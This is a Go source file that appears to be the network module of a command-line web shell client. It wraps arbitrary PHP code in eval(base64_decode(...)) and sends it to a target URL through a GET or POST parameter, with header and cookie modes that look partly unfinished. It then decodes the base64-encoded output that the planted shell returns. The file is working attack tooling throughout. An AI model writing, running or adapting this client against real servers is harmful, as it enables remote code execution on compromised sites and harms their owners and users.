package network

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"

	"github.com/urfave/cli"
)

var NET = NETWORK{
	host:      "http://localhost",
	method:    0,
	parameter: "fuzzer",
	crypt:     false,
	status:    false,
}

type config struct {
	url    string
	method string
	form   *bytes.Buffer
	jar    []string
	proxy  string
	cmd    string
}

type NETWORK struct {
	host      string
	method    int
	parameter string
	crypt     bool
	status    bool

	_config       config
	_body         url.Values
	_lastResponse *http.Response
}

func (n *NETWORK) IsSetup() bool {
	return n.status
}

func (n *NETWORK) Setup(c *cli.Context) {
	url := c.String("u")
	method := c.Int("m")
	parameter := c.String("p")
	crypt := false

	if url == "" {
		fmt.Println("flag -u (url) is required")
		return
	}

	if parameter == "" {
		parameter = n.parameter
	}

	n.host = url
	n.method = method
	n.parameter = parameter
	n.crypt = crypt

	n.status = true
}

func (n *NETWORK) _getHandleBack() string {
	var r string

	if n.method == 0 || n.method == 1 {
		r = "echo(base64_encode($r));exit();"
	} else if n.method == 2 {
		r = "header('" + n.parameter + ":' . base64_encode($r));exit();"
	} else if n.method == 3 {
		r = "setcookie('" + n.parameter + "', base64_encode($r));exit();"
	}

	return r
}

func (n *NETWORK) _encode(request *string) {
	sEnc := base64.StdEncoding.EncodeToString([]byte(*request))
	*request = "eval(base64_decode('" + sEnc + "'));"
}

func (n *NETWORK) _decode(response *string) {
	sDec, err := base64.StdEncoding.DecodeString(*response)

	if err != nil {
		panic(err)
	}

	*response = string(sDec)
}

func (n *NETWORK) _initConfig(r string) {
	c := config{
		url:    n.host,
		method: "GET",
	}

	n.status = true

	request := r + n._getHandleBack()
	n._encode(&request)

	if n.method == 0 { //GET
		c.url = n.host + "?" + n.parameter + "=" + request
	} else if n.method == 1 { //POST
		c.method = "POST"

		form := url.Values{}
		form.Set(n.parameter, request)
		n._body = form
		c.form = bytes.NewBufferString(form.Encode())
	} else if n.method == 3 { //COOKIE
		c.jar = []string{}
	} else {
		n.status = false
	}

	n._config = c
}

func (n *NETWORK) _headerConfig(req *http.Request) {
	if n.method == 1 {
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	} else if n.method == 2 {
		req.Header.Add(n.parameter, n._config.cmd)
	}
}

func (n *NETWORK) _handleSuccess(response *http.Response) {
	n._lastResponse = response

	defer response.Body.Close()
	buffer, err := ioutil.ReadAll(response.Body)

	if err != nil {
		panic(err)
	}

	body := string(buffer)
	n._decode(&body)

	fmt.Println(body)
}

func (n *NETWORK) Send(r string) {
	client := &http.Client{}
	n._initConfig(r)

	if n.status == false {
		err := new(error)
		panic(err)
	}

	var req *http.Request
	var err error

	if n._config.form != nil {
		req, err = http.NewRequest(n._config.method, n._config.url, n._config.form)
	} else {
		req, err = http.NewRequest(n._config.method, n._config.url, nil)
	}

	if err != nil {
		panic(err)
	}

	n._headerConfig(req)

	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	n._handleSuccess(resp)
}

func (n *NETWORK) RequestInfo(c *cli.Context) {
	if n._lastResponse == nil {
		fmt.Println("You havn't made a request. You must make a request before seeing any information")
		return
	}

	request := n._lastResponse.Request
	flag := false
	request.PostForm = n._body

	if c.Bool("url") {
		showRequestUrl(request)
		flag = true
	}

	if c.Bool("method") {
		showRequestMethod(request)
		flag = true
	}

	if c.Bool("body") {
		showRequestBody(request)
		flag = true
	}

	if c.Bool("headers") {
		showRequestHeaders(request)
		flag = true
	}

	if !flag {
		fmt.Println(request)
	}
}

func (n *NETWORK) ResponseInfo(c *cli.Context) {
	if n._lastResponse == nil {
		fmt.Println("You havn't made a request. You must make a request before seeing any information")
		return
	}

	response := n._lastResponse
	flag := false

	if c.Bool("status") {
		showResponseStatus(response)
		flag = true
	}

	if c.Bool("body") {
		showResponseBody(response)
		flag = true
	}

	if c.Bool("headers") {
		showResponseHeaders(response)
		flag = true
	}

	if c.Bool("request") {
		showResponseRequest(response)
		flag = true
	}

	if !flag {
		fmt.Println(response)
	}
}
